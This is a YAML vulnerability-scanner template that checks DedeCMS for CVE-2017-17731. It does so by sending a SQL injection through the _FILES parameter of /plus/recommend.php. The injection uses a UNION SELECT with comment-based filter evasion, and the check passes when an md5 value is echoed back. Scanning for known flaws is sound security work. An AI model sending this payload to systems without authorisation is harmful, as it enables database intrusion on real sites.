name: poc-yaml-dedecms-cve-2017-17731-sqli
binding: 7e248c7f-9519-46e0-b69d-6e45eb5ea8ac
manual: true
detail:
    author: sharecast
    links:
        - https://github.com/fengxuangit/dede_exp_collect/blob/master/dede_recommend.php_sqli.py
    vulnerability:
        id: CT-132706
        level: critical
transport: http
set:
    r: randomInt(800000, 1000000)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\%27%20or%20mid=@`\%27`%20/*!50000union*//*!50000select*/1,2,3,md5({{r}}),5,6,7,8,9%23@`\%27`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294
            follow_redirects: true
        expression: response.status == 200 && response.body.bcontains(bytes(md5(string(r))))
expression: r0()
